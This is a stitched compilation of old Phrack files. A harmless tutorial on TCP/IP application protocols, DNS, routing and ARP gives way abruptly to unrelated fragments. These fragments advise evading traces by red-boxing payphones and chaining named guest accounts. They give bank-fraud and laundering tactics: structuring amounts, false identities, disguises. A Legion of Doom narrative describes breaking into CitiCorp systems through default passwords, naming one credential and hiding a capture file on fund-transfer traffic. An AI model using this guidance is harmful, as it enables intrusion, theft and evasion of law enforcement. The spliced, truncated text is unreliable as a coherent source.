This is not intended to be a complete description, but it can give you a reasonable idea of the capabilities of the protocols.  However, if you need to know any details of the technology, you will want to read the standards yourself.  Throughout this file, you will find references to the standards, in the form of  RFC   Request For Comments  or  IEN   Internet Engineering Notes  numbers    these are document numbers.  The final section  Getting More Information  explains how you can get copies of those standards.   Well Known Sockets And The Applications Layer                                               In part one of this series, I described how a stream of data is broken up into datagrams, sent to another computer, and put back together.  However something more is needed in order to accomplish anything useful.  There has to be a way for you to open a connection to a specified computer, log into it, tell it what file you want, and control the transmission of the file.   If you have a different application in mind, e.g. computer mail, some analogous protocol is needed.   This is done by  application protocols.   The application protocols run  on top  of TCP IP.  That is, when they want to send a message, they give the message to TCP.  TCP makes sure it gets delivered to the other end. Because TCP and IP take care of all the networking details, the applications protocols can treat a network connection as if it were a simple byte stream, like a terminal or phone line.  Before going into more details about applications programs, we have to describe how you find an application.  Suppose you want to send a file to a computer whose Internet address is 128.6.4.7.  To start the process, you need more than just the Internet address.  You have to connect to the FTP server at the other end.  In general, network programs are specialized for a specific set of tasks. Most systems have separate programs to handle file transfers, remote terminal logins, mail, etc.  When you connect to 128.6.4.7, you have to specify that you want to talk to the FTP server.  This is done by having  well known sockets  for each server.  Recall that TCP uses port numbers to keep track of individual conversations.  User programs normally use more or less random port numbers. However specific port numbers are assigned to the programs that sit waiting for requests.  For example, if you want to send a file, you will start a program called  ftp.   It will open a connection using some random number, say 1234, for the port number on its end.  However it will specify port number 21 for the other end.  This is the official port number for the FTP server.  Note that there are two different programs involved.  You run ftp on your side.  This is a program designed to accept commands from your terminal and pass them on to the other end.  The program that you talk to on the other machine is the FTP server.  It is designed to accept commands from the network connection, rather than an interactive terminal.  There is no need for your program to use a well known socket number for itself.  Nobody is trying to find it.  However the servers have to have well known numbers, so that people can open connections to them and start sending them commands.  The official port numbers for each program are given in  Assigned Numbers.   Note that a connection is actually described by a set of 4 numbers   The Internet address at each end, and the TCP port number at each end.  Every datagram has all four of those numbers in it.   The Internet addresses are in the IP header, and the TCP port numbers are in the TCP header.   In order to keep things straight, no two connections can have the same set of numbers. However it is enough for any one number to be different.  For example, it is perfectly possible for two different users on a machine to be sending files to the same other machine.  This could result in connections with the following parameters                        Internet addresses         TCP ports       connection 1  128.6.4.194, 128.6.4.7      1234, 21       connection 2  128.6.4.194, 128.6.4.7      1235, 21  Since the same machines are involved, the Internet addresses are the same. Since they are both doing file transfers, one end of the connection involves the well known port number for FTP.  The only thing that differs is the port number for the program that the users are running.  That's enough of a difference.  Generally, at least one end of the connection asks the network software to assign it a port number that is guaranteed to be unique.  Normally, it's the user's end, since the server has to use a well known number.  Now that we know how to open connections, let's get back to the applications programs.  As mentioned earlier, once TCP has opened a connection, we have something that might as well be a simple wire.  All the hard parts are handled by TCP and IP.  However we still need some agreement as to what we send over this connection.  In effect this is simply an agreement on what set of commands the application will understand, and the format in which they are to be sent. Generally, what is sent is a combination of commands and data.  They use context to differentiate.  For example, the mail protocol works like this  Your mail program opens a connection to the mail server at the other end.  Your program gives it your machine's name, the sender of the message, and the recipients you want it sent to.  It then sends a command saying that it is starting the message.  At that point, the other end stops treating what it sees as commands, and starts accepting the message.  Your end then starts sending the text of the message.  At the end of the message, a special mark is sent  a dot in the first column .  After that, both ends understand that your program is again sending commands.  This is the simplest way to do things, and the one that most applications use.  File transfer is somewhat more complex.  The file transfer protocol involves two different connections.  It starts out just like mail.  The user's program sends commands like  log me in as this user,   here is my password,   send me the file with this name.   However once the command to send data is sent, a second connection is opened for the data itself.  It would certainly be possible to send the data on the same connection, as mail does.  However file transfers often take a long time.  The designers of the file transfer protocol wanted to allow the user to continue issuing commands while the transfer is going on.  For example, the user might make an inquiry, or he might abort the transfer.  Thus the designers felt it was best to use a separate connection for the data and leave the original command connection for commands.   It is also possible to open command connections to two different computers, and tell them to send a file from one to the other.  In that case, the data couldn't go over the command connection.   Remote terminal connections use another mechanism still.  For remote logins, there is just one connection.  It normally sends data.  When it is necessary to send a command  e.g. to set the terminal type or to change some mode , a special character is used to indicate that the next character is a command.  If the user happens to type that special character as data, two of them are sent.  I am not going to describe the application protocols in detail in this file. It is better to read the RFCs yourself.  However there are a couple of common conventions used by applications that will be described here.  First, the common network representation   TCP IP is intended to be usable on any computer.  Unfortunately, not all computers agree on how data is represented.  There are differences in character codes  ASCII vs. EBCDIC , in end of line conventions  carriage return, line feed, or a representation using counts , and in whether terminals expect characters to be sent individually or a line at a time.  In order to allow computers of different kinds to communicate, each applications protocol defines a standard representation.  Note that TCP and IP do not care about the representation.  TCP simply sends octets.  However the programs at both ends have to agree on how the octets are to be interpreted.  The RFC for each application specifies the standard representation for that application.  Normally it is  net ASCII.   This uses ASCII characters, with end of line denoted by a carriage return followed by a line feed.  For remote login, there is also a definition of a  standard terminal,  which turns out to be a half duplex terminal with echoing happening on the local machine.  Most applications also make provisions for the two computers to agree on other representations that they may find more convenient.  For example, PDP 10's have 36 bit words.  There is a way that two PDP 10's can agree to send a 36 bit binary file.  Similarly, two systems that prefer full duplex terminal conversations can agree on that.  However each application has a standard representation, which every machine must support.  So that you might get a better idea of what is involved in the application protocols, here is an imaginary example of SMTP  the simple mail transfer protocol.   Assume that a computer called FTS.PHRACK.EDU wants to send the following message.     Date  Fri, 17 Nov 89 15 42 06 EDT    From  knight fts.phrack.edu    To  taran msp.phrack.edu    Subject  Anniversary     Four years is quite a long time to be around.  Happy Anniversary!  Note that the format of the message itself is described by an Internet standard  RFC 822 .  The standard specifies the fact that the message must be transmitted as net ASCII  i.e. it must be ASCII, with carriage return linefeed to delimit lines .  It also describes the general structure, as a group of header lines, then a blank line, and then the body of the message.  Finally, it describes the syntax of the header lines in detail.  Generally they consist of a keyword and then a value.  Note that the addressee is indicated as TARAN MSP.PHRACK.EDU.  Initially, addresses were simply  person at machine.   Today's standards are much more flexible.  There are now provisions for systems to handle other systems' mail. This can allow automatic forwarding on behalf of computers not connected to the Internet.  It can be used to direct mail for a number of systems to one central mail server.  Indeed there is no requirement that an actual computer by the name of FTS.PHRACK.EDU even exist  and it doesn't .  The name servers could be set up so that you mail to department names, and each department's mail is routed automatically to an appropriate computer.  It is also possible that the part before the   is something other than a user name.  It is possible for programs to be set up to process mail.  There are also provisions to handle mailing lists, and generic names such as  postmaster  or  operator.   The way the message is to be sent to another system is described by RFCs 821 and 974.  The program that is going to be doing the sending asks the name server several queries to determine where to route the message.  The first query is to find out which machines handle mail for the name FTS.PHRACK.EDU. In this case, the server replies that FTS.PHRACK.EDU handles its own mail.  The program then asks for the address of FTS.PHRACK.EDU, which for the sake of this example is is 269.517.724.5.  Then the the mail program opens a TCP connection to port 25 on 269.517.724.5.  Port 25 is the well known socket used for receiving mail.  Once this connection is established, the mail program starts sending commands.  Here is a typical conversation.  Each line is labelled as to whether it is from FTS or MSP.  Note that FTS initiated the connection        MSP    220 MSP.PHRACK.EDU SMTP Service at 17 Nov 89 09 35 24 EDT      FTS    HELO fts.phrack.edu      MSP    250 MSP.PHRACK.EDU   Hello, FTS.PHRACK.EDU      FTS    MAIL From  knight fts.phrack.edu       MSP    250 MAIL accepted      FTS    RCPT To  taran msp.phrack.edu       MSP    250 Recipient accepted      FTS    DATA      MSP    354 Start mail input  end with  CRLF . CRLF       FTS    Date  Fri, 17 Nov 89 15 42 06 EDT      FTS    From  knight fts.phrack.edu      FTS    To  taran msp.phrack.edu      FTS    Subject  Anniversary      FTS      FTS    Four years is quite a long time to be around.  Happy Anniversary!      FTS    .      MSP    250 OK      FTS    QUIT      MSP    221 MSP.PHRACK.EDU Service closing transmission channel  The commands all use normal text.  This is typical of the Internet standards. Many of the protocols use standard ASCII commands.  This makes it easy to watch what is going on and to diagnose problems.  The mail program keeps a log of each conversation so if something goes wrong, the log file can simply be mailed to the postmaster.  Since it is normal text, he can see what was going on.  It also allows a human to interact directly with the mail server, for testing.  The responses all begin with numbers.  This is also typical of Internet protocols.  The allowable responses are defined in the protocol.  The numbers allow the user program to respond unambiguously.  The rest of the response is text, which is normally for use by any human who may be watching or looking at a log.  It has no effect on the operation of the programs.  The commands themselves simply allow the mail program on one end to tell the mail server the information it needs to know in order to deliver the message.  In this case, the mail server could get the information by looking at the message itself.  Every session must begin with a HELO, which gives the name of the system that initiated the connection.  Then the sender and recipients are specified.  There can be more than one RCPT command, if there are several recipients.  Finally the data itself is sent.  Note that the text of the message is terminated by a line containing just a period, but if such a line appears in the message, the period is doubled.  After the message is accepted, the sender can send another message, or terminate the session as in the example above.  Generally, there is a pattern to the response numbers.  The protocol defines the specific set of responses that can be sent as answers to any given command. However programs that don't want to analyze them in detail can just look at the first digit.  In general, responses that begin with a 2 indicate success. Those that begin with 3 indicate that some further action is needed, as shown above.  4 and 5 indicate errors.  4 is a  temporary  error, such as a disk filling.  The message should be saved, and tried again later.  5 is a permanent error, such as a non existent recipient.  The message should be returned to the sender with an error message.  For more details about the protocols mentioned in this section, see RFCs 821 822 for mail, RFC 959 for file transfer, and RFCs 854 855 for remote logins.  For the well known port numbers, see the current edition of Assigned Numbers, and possibly RFC 814.   Protocols Other Than TCP   UDP and ICMP                                         Thus far only connections that use TCP have been described.  Remember that TCP is responsible for breaking up messages into datagrams, and reassembling them properly.  However in many applications, there are messages that will always fit in a single datagram.  An example is name lookup.  When a user attempts to make a connection to another system, he will generally specify the system by name, rather than Internet address.  His system has to translate that name to an address before it can do anything.  Generally, only a few systems have the database used to translate names to addresses.  So the user's system will want to send a query to one of the systems that has the database.  This query is going to be very short.  It will certainly fit in one datagram. So will the answer.  Thus it seems silly to use TCP.  Of course TCP does more than just break things up into datagrams.  It also makes sure that the data arrives, resending datagrams where necessary.  But for a question that fits in a single datagram, all of the complexity of TCP is not needed.  If there is not an answer after a few seconds, you can just ask again.  For applications like this, there are alternatives to TCP.  The most common alternative is UDP   user datagram protocol  .  UDP is designed for applications where you don't need to put sequences of datagrams together. It fits into the system much like TCP.  There is a UDP header.  The network software puts the UDP header on the front of your data, just as it would put a TCP header on the front of your data.  Then UDP sends the data to IP, which adds the IP header, putting UDP's protocol number in the protocol field instead of TCP's protocol number.  UDP doesn't do as much as TCP does.  It does not split data into multiple datagrams and it does not keep track of what it has sent so it can resend if necessary.  About all that UDP provides is port numbers so that several programs can use UDP at once.  UDP port numbers are used just like TCP port numbers.  There are well known port numbers for servers that use UDP.  The UDP header is shorter than a TCP header.  It still has source and destination port numbers, and a checksum, but that's about it.  UDP is used by the protocols that handle name lookups  see IEN 116, RFC 882, and RFC 883  and a number of similar protocols.  Another alternative protocol is ICMP   Internet control message protocol  . ICMP is used for error messages, and other messages intended for the TCP IP software itself, rather than any particular user program.  For example, if you attempt to connect to a host, your system may get back an ICMP message saying  host unreachable.   ICMP can also be used to find out some information about the network.  See RFC 792 for details of ICMP.  ICMP is similar to UDP, in that it handles messages that fit in one datagram. However it is even simpler than UDP.  It does not even have port numbers in its header.  Since all ICMP messages are interpreted by the network software itself, no port numbers are needed to say where an ICMP message is supposed to go.   Keeping Track Of Names And Information   The Domain System                                                            As we indicated earlier, the network software generally needs a 32 bit Internet address in order to open a connection or send a datagram.  However users prefer to deal with computer names rather than numbers.  Thus there is a database that allows the software to look up a name and find the corresponding number.  When the Internet was small, this was easy.  Each system would have a file that listed all of the other systems, giving both their name and number.  There are now too many computers for this approach to be practical.  Thus these files have been replaced by a set of name servers that keep track of host names and the corresponding Internet addresses.   In fact these servers are somewhat more general than that.  This is just one kind of information stored in the domain system.   A set of interlocking servers are used rather than a single central one.  There are now so many different institutions connected to the Internet that it would be impractical for them to notify a central authority whenever they installed or moved a computer.  Thus naming authority is delegated to individual institutions.  The name servers form a tree, corresponding to institutional structure. The names themselves follow a similar structure.  A typical example is the name BORAX.LCS.MIT.EDU.  This is a computer at the Laboratory for Computer Science  LCS  at MIT.  In order to find its Internet address, you might potentially have to consult 4 different servers.  First, you would ask a central server  called the root  where the EDU server is.  EDU is a server that keeps track of educational institutions.  The root server would give you the names and Internet addresses of several servers for EDU.  You would then ask EDU where the server for MIT is.  It would give you names and Internet addresses of several servers for MIT.  Then you would ask MIT where the server for LCS is, and finally you would ask one of the LCS servers about BORAX.  The final result would be the Internet address for BORAX.LCS.MIT.EDU.  Each of these levels is referred to as a  domain.   The entire name, BORAX.LCS.MIT.EDU, is called a  domain name.    So are the names of the higher level domains, such as LCS.MIT.EDU, MIT.EDU, and EDU.   Fortunately, you don't really have to go through all of this most of the time. First of all, the root name servers also happen to be the name servers for the top level domains such as EDU.  Thus a single query to a root server will get you to MIT.  Second, software generally remembers answers that it got before. So once we look up a name at LCS.MIT.EDU, our software remembers where to find servers for LCS.MIT.EDU, MIT.EDU, and EDU.  It also remembers the translation of BORAX.LCS.MIT.EDU.  Each of these pieces of information has a  time to live  associated with it.  Typically this is a few days.  After that, the information expires and has to be looked up again.  This allows institutions to change things.  The domain system is not limited to finding out Internet addresses.  Each domain name is a node in a database.  The node can have records that define a number of different properties.  Examples are Internet address, computer type, and a list of services provided by a computer.  A program can ask for a specific piece of information, or all information about a given name.  It is possible for a node in the database to be marked as an  alias   or nickname  for another node.  It is also possible to use the domain system to store information about users, mailing lists, or other objects.  There is an Internet standard defining the operation of these databases as well as the protocols used to make queries of them.  Every network utility has to be able to make such queries since this is now the official way to evaluate host names.  Generally utilities will talk to a server on their own system.  This server will take care of contacting the other servers for them.  This keeps down the amount of code that has to be in each application program.  The domain system is particularly important for handling computer mail.  There are entry types to define what computer handles mail for a given name to specify where an individual is to receive mail and to define mailing lists.  See RFCs 882, 883, and 973 for specifications of the domain system.  RFC 974 defines the use of the domain system in sending mail.  Routing         The task of finding how to get a datagram to its destination is referred to as  routing.   Many of the details depend upon the particular implementation. However some general things can be said.  It is necessary to understand the model on which IP is based.  IP assumes that a system is attached to some local network.  It is assumed that the system can send datagrams to any other system on its own network.   In the case of Ethernet, it simply finds the Ethernet address of the destination system, and puts the datagram out on the Ethernet.   The problem comes when a system is asked to send a datagram to a system on a different network.  This problem is handled by gateways.  A gateway is a system that connects a network with one or more other networks. Gateways are often normal computers that happen to have more than one network interface.  The software on a machine must be set up so that it will forward datagrams from one network to the other.  That is, if a machine on network 128.6.4 sends a datagram to the gateway, and the datagram is addressed to a machine on network 128.6.3, the gateway will forward the datagram to the destination.  Major communications centers often have gateways that connect a number of different networks.  Routing in IP is based entirely upon the network number of the destination address.  Each computer has a table of network numbers.  For each network number, a gateway is listed.  This is the gateway to be used to get to that network.  The gateway does not have to connect directly to the network, it just has to be the best place to go to get there.  When a computer wants to send a datagram, it first checks to see if the destination address is on the system's own local network.  If so, the datagram can be sent directly.  Otherwise, the system expects to find an entry for the network that the destination address is on.  The datagram is sent to the gateway listed in that entry.  This table can get quite big.  For example, the Internet now includes several hundred individual networks.  Thus various strategies have been developed to reduce the size of the routing table.  One strategy is to depend upon  default routes.   There is often only one gateway out of a network.  This gateway might connect a local Ethernet to a campus wide backbone network. In that case, it is not neccessary to have a separate entry for every network in the world.  That gateway is simply defined as a  default.   When no specific route is found for a datagram, the datagram is sent to the default gateway.  A default gateway can even be used when there are several gateways on a network. There are provisions for gateways to send a message saying  I'm not the best gateway    use this one instead.    The message is sent via ICMP.  See RFC 792.   Most network software is designed to use these messages to add entries to their routing tables.  Suppose network 128.6.4 has two gateways, 128.6.4.59 and 128.6.4.1.  128.6.4.59 leads to several other internal Rutgers networks. 128.6.4.1 leads indirectly to the NSFnet.  Suppose 128.6.4.59 is set as a default gateway, and there are no other routing table entries.  Now what happens when you need to send a datagram to MIT   MIT is network 18.  Since there is no entry for network 18, the datagram will be sent to the default, 128.6.4.59.  This gateway is the wrong one.  So it will forward the datagram to 128.6.4.1.  It will also send back an error saying in effect    to get to network 18, use 128.6.4.1.   The software will then add an entry to the routing table.  Any future datagrams to MIT will then go directly to 128.6.4.1.   The error message is sent using the ICMP protocol.  The message type is called  ICMP redirect.    Most IP experts recommend that individual computers should not try to keep track of the entire network.  Instead, they should start with default gateways and let the gateways tell them the routes as just described.  However this doesn't say how the gateways should find out about the routes.  The gateways can't depend upon this strategy.  They have to have fairly complete routing tables.  For this, some sort of routing protocol is needed.  A routing protocol is simply a technique for the gateways to find each other and keep up to date about the best way to get to every network.  RFC 1009 contains a review of gateway design and routing.   Details About Internet Addresses   Subnets And Broadcasting                                                             Internet addresses are 32 bit numbers, normally written as 4 octets  in decimal , e.g. 128.6.4.7.  There are actually 3 different types of address. The problem is that the address has to indicate both the network and the host within the network.  It was felt that eventually there would be lots of networks.  Many of them would be small, but probably 24 bits would be needed to represent all the IP networks.  It was also felt that some very big networks might need 24 bits to represent all of their hosts.  This would seem to lead to 48 bit addresses.  But the designers really wanted to use 32 bit addresses.  So they adopted a kludge.  The assumption is that most of the networks will be small.  So they set up three different ranges of address.  Addresses beginning with 1 to 126 use only the first octet for the network number.  The other three octets are available for the host number.  Thus 24 bits are available for hosts.  These numbers are used for large networks, but there can only be 126 of these.  The ARPAnet is one and there are a few large commercial networks.  But few normal organizations get one of these  class A  addresses.  For normal large organizations,  class B  addresses are used.  Class B addresses use the first two octets for the network number.  Thus network numbers are 128.1 through 191.254.   0 and 255 are avoided for reasons to be explained below.  Addresses beginning with 127 are also avoided because they are used by some systems for special purposes.   The last two octets are available for host addesses, giving 16 bits of host address.  This allows for 64516 computers, which should be enough for most organizations.  Finally, class C addresses use three octets in the range 192.1.1 to 223.254.254.  These allow only 254 hosts on each network, but there can be lots of these networks. Addresses above 223 are reserved for future use as class D and E  which are currently not defined .  0 and 255 have special meanings.  0 is reserved for machines that do not know their address.  In certain circumstances it is possible for a machine not to know the number of the network it is on, or even its own host address.  For example, 0.0.0.23 would be a machine that knew it was host number 23, but didn't know on what network.  255 is used for  broadcast.   A broadcast is a message that you want every system on the network to see.  Broadcasts are used in some situations where you don't know who to talk to.  For example, suppose you need to look up a host name and get its Internet address.  Sometimes you don't know the address of the nearest name server.  In that case, you might send the request as a broadcast. There are also cases where a number of systems are interested in information. It is then less expensive to send a single broadcast than to send datagrams individually to each host that is interested in the information.  In order to send a broadcast, you use an address that is made by using your network address, with all ones in the part of the address where the host number goes. For example, if you are on network 128.6.4, you would use 128.6.4.255 for broadcasts.  How this is actually implemented depends upon the medium.  It is not possible to send broadcasts on the ARPAnet, or on point to point lines, but it is possible on an Ethernet.  If you use an Ethernet address with all its bits on  all ones , every machine on the Ethernet is supposed to look at that datagram.  Because 0 and 255 are used for unknown and broadcast addresses, normal hosts should never be given addresses containing 0 or 255.  Addresses should never begin with 0, 127, or any number above 223.   Datagram Fragmentation And Reassembly                                       TCP IP is designed for use with many different kinds of networks. Unfortunately, network designers do not agree about how big packets can be. Ethernet packets can be 1500 octets long.  ARPAnet packets have a maximum of around 1000 octets.  Some very fast networks have much larger packet sizes. You might think that IP should simply settle on the smallest possible size, but this would cause serious performance problems.  When transferring large files, big packets are far more efficient than small ones.  So it is best to be able to use the largest packet size possible, but it is also necessary to be able to handle networks with small limits.  There are two provisions for this.  TCP has the ability to  negotiate  about datagram size.  When a TCP connection first opens, both ends can send the maximum datagram size they can handle.  The smaller of these numbers is used for the rest of the connection.  This allows two implementations that can handle big datagrams to use them, but also lets them talk to implementations that cannot handle them.  This does not completely solve the problem.  The most serious problem is that the two ends do not necessarily know about all of the steps in between.  For this reason, there are provisions to split datagrams up into pieces.  This is referred to as  fragmentation.   The IP header contains fields indicating that a datagram has been split and enough information to let the pieces be put back together.  If a gateway connects an Ethernet to the Arpanet, it must be prepared to take 1500 octet Ethernet packets and split them into pieces that will fit on the Arpanet. Furthermore, every host implementation of TCP IP must be prepared to accept pieces and put them back together.  This is referred to as  reassembly.   TCP IP implementations differ in the approach they take to deciding on datagram size.  It is fairly common for implementations to use 576 byte datagrams whenever they can't verify that the entire path is able to handle larger packets.  This rather conservative strategy is used because of the number of implementations with bugs in the code to reassemble fragments.  Implementors often try to avoid ever having fragmentation occur.  Different implementors take different approaches to deciding when it is safe to use large datagrams. Some use them only for the local network.  Others will use them for any network on the same campus.  576 bytes is a  safe  size which every implementation must support.  Ethernet Encapsulation   ARP                              In Part One of Introduction to the Internet Protocols  Phrack Inc., Volume Three, Issue 28, File  3 of 12  there was a brief description about what IP datagrams look like on an Ethernet.  The discription showed the Ethernet header and checksum, but it left one hole   It did not say how to figure out what Ethernet address to use when you want to talk to a given Internet address. There is a separate protocol for this called ARP   address resolution protocol   and it is not an IP protocal as ARP datagrams do not have IP headers.  Suppose you are on system 128.6.4.194 and you want to connect to system 128.6.4.7.  Your system will first verify that 128.6.4.7 is on the same network, so it can talk directly via Ethernet.  Then it will look up 128.6.4.7 in its ARP table to see if it already knows the Ethernet address.  If so, it will stick on an Ethernet header and send the packet.  Now suppose this system is not in the ARP table.  There is no way to send the packet because you need the Ethernet address.  So it uses the ARP protocol to send an ARP request. Essentially an ARP request says  I need the Ethernet address for 128.6.4.7 . Every system listens to ARP requests.  When a system sees an ARP request for itself, it is required to respond.  So 128.6.4.7 will see the request and will respond with an ARP reply saying in effect  128.6.4.7 is 8 0 20 1 56 34 .  Your system will save this information in its ARP table so future packets will go directly.  ARP requests must be sent as  broadcasts.   There is no way that an ARP request can be sent directly to the right system because the whole reason for sending an ARP request is that you do not know the Ethernet address.  So an Ethernet address of all ones is used, i.e. ff ff ff ff ff ff.  By convention, every machine on the Ethernet is required to pay attention to packets with this as an address.  So every system sees every ARP requests.  They all look to see whether the request is for their own address.  If so, they respond.  If not, they could just ignore it, although some hosts will use ARP requests to update their knowledge about other hosts on the network, even if the request is not for them.  Packets whose IP address indicates broadcast  e.g. 255.255.255.255 or 128.6.4.255  are also sent with an Ethernet address that is all ones.   Getting More Information                          This directory contains documents describing the major protocols.  There are hundreds of documents, so I have chosen the ones that seem most important. Internet standards are called RFCs  Request for Comments .  A proposed standard is initially issued as a proposal, and given an RFC number.  When it is finally accepted, it is added to Official Internet Protocols, but it is still referred to by the RFC number.  I have also included two IENs  Internet Engineering Notes .  IENs used to be a separate classification for more informal documents, but this classification no longer exists and RFCs are now used for all official Internet documents with a mailing list being used for more informal reports.  The convention is that whenever an RFC is revised, the revised version gets a new number.  This is fine for most purposes, but it causes problems with two documents   Assigned Numbers and Official Internet Protocols.  These documents are being revised all the time and the RFC number keeps changing.  You will have to look in rfc index.txt to find the number of the latest edition.  Anyone who is seriously interested in TCP IP should read the RFC describing IP  791 . RFC 1009 is also useful as it is a specification for gateways to be used by NSFnet and it contains an overview of a lot of the TCP IP technology.  Here is a list of the documents you might want        rfc index List of all RFCs      rfc1012   Somewhat fuller list of all RFCs      rfc1011   Official Protocols.

This defines which RFCs are                actual standards, as opposed to requests for comments.      rfc1010   Assigned Numbers.  If you are working with TCP IP, you will                probably want a hardcopy of this as a reference.

PUBLIC ACCESS UNIXES                      Part of the problem with the whole idea of using the Wide Area Networks is access.  For those who are not enrolled in a university or cannot pull strings at their local business or college, the concept of communicating through the networks is useless besides thinking that it would be neat.

There are several methods for doing this and all of them will depend on your destination, available time, goal and the phase of the moon.  This article deals mostly with cover attacks via a connected network.  If attacking via a phone link     o  Tap in to your local payphone line and red box or  sprint  the call.    o  Using a long haul service  like Sprint or MCI  to dial into systems in          remote cities.   This should hinder a track by a good order of          magnitude.     o  Use a midnight packet switching network  eg  PC Pursuit, Tymnet, et. al.     o  All the above.   If attacking from a network  eg  the Internet  there are ways of spoofing the packet headers, but this requires superuser privileges on the system you are attacking from and a fair amount of 'C' programming expertise.  Therefore, this will not be discussed here in any more detail.  Another obvious trick is to use network routers and gateways along with guest accounts to  route  your data path.  This will cause the person tracking you to have to go though more red tape and hassle to track you.  This gives you more time to cover your tracks.  Some useful paths I know of are   accuvax.nwu.edu cory.berkeley.edu violet.berkeley.edu headcrash.berkeley.edu       host  violet.berkeley.edu           host  headcrash.berkeley.edu     account  nobody                     account  netgate     net address 128.32.136.22           net address  128.32.234.31       host  cory.berkeley.edu             host accuvax.nwu.edu     account  terminal                   account  telnet     net address  128.32.134.6           net address  129.105.49.1       host  lightning.berkeley.edu        host  score.stanford.edu     port  8033                          account  guest     net address  128.32.234.10          net address  36.8.0.46   The accounts nobody, netgate, and terminal at Berkeley are accounts that were installed so that people can use the system to rlogin or telnet to an account elsewhere without a local login  or so I am told by the local hackers  Hi Audrey...  .  The lightning path method can be accessed by the command   telnet lightning.berkeley.edu 8033 .  I am interested in hearing about other Internet access accounts that are available out there.  If you know of any please send them in.  Tymnet is also a useful method of gaining access to systems.  From Tymnet, you can hook up to just about any computer and use the other methods to go one step further.  It's not until you are traced back to the computer you linked to from Tymnet that they can even begin to follow you back.  My understanding is that for a systen to find your Tymnet node, they must contact Tymnet personally and ask them to put a trap on their connection.

The check number, the account number, and the ABA          Transit Number will all be encoded in magnetic ink.  The ABA Number          will be enclosed in symbols like      ABANUMBER     The grouping of          the ABA and Federal Reserve Codes will also usually appear at the          upper right hand corner of the check.           Keep in mind that there are a great many checks involved in any          banking procedure, and almost any transaction evoked improperly will          draw attention.  Furthermore, the documents generated in a legitimate          wire transfer situation are quite extensive.  Should a transaction be          noticed, and these documents are not available for scrutiny, again          attention will be drawn to the situation.

Amounts should be kept under the  10,000 range in order not to immediately arouse suspicion.  Attacks must executed correctly the first time, as there will be no possibilities for a second chance.  Monies must be gathered rapidly and dispersed into various outlets to avoid additional attention.  Transfers to banking systems whose countries keep strict right to privacy laws, such as Panama, Switzerland, et.al. are not recommended as the transactions are much more involved and there exists a greater potential for error in international wire transfers.  The preferred method of transfer of funds would involve one or more false identities, complete with state approved identification or passport and social security cards.  Bank Security Film is kept on file, so it would be preferred that some semblance of disguise be implemented, ranging from hair bleaching, sun tanning, makeup, false accents, facial hair, etc.  Various accounts in the assumed name would be opened in several cities with the minimum initial balance.  Within approximately two weeks, funds of no more than  7500 would be diverted to each account.  The funds would then be withdrawn in cash with no more than  5000 from each account, the balance being left in the account.  Once the funds have been made cash, they would then be distributed to foreign banks, or invested in foreign markets to avoid detection by the Internal Revenue Service.  Conviction for Illegal Transference of Funds is not recommended.                                        END                                                  Phrack Inc.                         Volume Three, Issue 29, File  7 of 12                                The Legion of Doom!                                  EFT Division                                     Presents                 HOW WE GOT RICH THROUGH ELECTRONIC FUND TRANSFERS                                OR   GEE!  NO, GTE!         A certain number of financial institutions that reside within the packet switched confines of the various X.25 networks use their connections to transfer funds from one account to another, one mutual fund to another, one stock to another, one bank to another, etc...  It is conceivable that if one could intercept these transactions and divert them into another account, they would be transferred  and could be withdrawn  before the computer error was noticed.  Thus, with greed in our hearts, an associate and I set forth to test this theory and conquer the international banking world.       We chose CitiCorp as our victim.  This multinational had two address prefixes of its own on Telenet  223   224 .  Starting with those two prefixes, my associate and I began to sequentially try every possible address.  We continued through 1000 in increments of one, then A Z, then 1000 10000 by 10's, and finally 10000 99999 by 100's.  Needless to say, many addresses were probably skipped over in our haste to find valid ones, but many we passed over were most likely duplicate terminals that we had already encountered.       For the next few days my associate and I went over the addresses we had found, comparing and exchanging information, and going back to the addresses that had shown 'NOT OPERATING,' 'REMOTE PROCEDURE ERROR,' and 'REJECTING.'  We had discovered many of the same types of systems, mostly VAX VMS's and Primes. We managed to get into eight of the VAXen and then went forth on the CitiCorp DECNET, discovering many more.  We entered several GS1 gateways and Decservers and found that there were also links leading to systems belonging to other financial institutions such as Dai Ichi Kangyo Bank New York and Chase Manhattan.  We also found hundreds of addresses to TWX machines and many in house bank terminals  most of which were 'BUSY' during banking hours, and 'NOT OPERATING' during off hours .  In fact, the only way we knew that these were bank terminals was that an operator happened to be idle just as I connected with her terminal  almost like the Whoopie Goldberg movie,  Jumpin' Jack Flash,  not quite as glamorous ...yet.        Many of the computers we eventually did penetrate kept alluding to the electronic fund transfer in scripts, files, and personal mail.  One of the TOPS 20 machines we found even had an account EFTMKTG.EFT,  password EFTEFT ! All the traces pointed to a terminal  or series of terminals  that did nothing but transfer funds.  We decided that this was the case and decided to concentrate our efforts on addresses that allowed us to CONNECT periodically but did not respond.  After another week of concentrated effort, we managed to sort through these.  Many were just terminals that had been down or malfunctioning, but there were five left that we still had no idea of their function.  My associate said that we might be able to monitor data transmissions on the addresses if we could get into the debug port.  With this idea in mind, we set out trying sub addresses from .00 to .99 on the mystery addresses.  Four of the five had their debug ports at the default location  .99 .  The fifth was located 23 away from the default.  That intrigued us, so we put the others aside and concentrated on the fifth.  Although its location was moved, a default password was still intact, and we entered surreptitiously.       The system was menu driven with several options available.  One option, Administrative Functions, put us into a UNIX shell with root privilege.  After an hour or so of nosing around, we found a directory that held the Telenet Debug Tools package  which I had previously thought existed solely for Prime computers .  Using TDT, we were able to divert all data  incoming and outgoing  into a file so we could later read and analyze it.  We named the file  .trans  and placed it in a directory named  ..   ,  dot, dot, space, space  so it would remain hidden.  This was accomplished fairly late on a Sunday night.  After logging off, we opened a case of Coors Light and spent the rest of the night  and part of the morning!  theorizing about what we might see tomorrow night  and getting rather drunk .       At approximately 9 00 p.m. the following evening, we met again and logged onto the system to view the capture file, hoping to find something useful.  We didn't have to look very far!  The first transmission was just what we had been dreaming about all along.  The computer we were monitoring initiated by connecting with a similar computer at another institution, waited for a particular control sequence to be sent, and then transferred a long sequence of numbers and letters.  We captured about 170 different transactions on the first day and several hundred more in the following week.  After one business week, we removed the file and directory, killed the TDT routine, and went through the system removing all traces that we had been there.       We felt that we had enough to start piecing together what it all meant, so we uploaded our findings to the LOD HP 3000  ARMA  in Turkey.  This way we could both have access to the data, but keep it off our home systems.  We didn't bother to tell any of the other LOD members about our doings, as most had retired, been busted, or were suspected of turning information over to the Secret Service.  Using this as a base, we analyzed the findings, sorted them, looked for strings being sent, etc.       We came to the conclusion that the transmissions were being sent in the following way         XXXXXXXXXXXXTCxxxxxxxxxxxx NNNNNNNNNNNNCnnnnnnnnnnnnAMzzzzzzz.zzOP       X Originating Bank ID      T Transfer  Also could be R ecieve 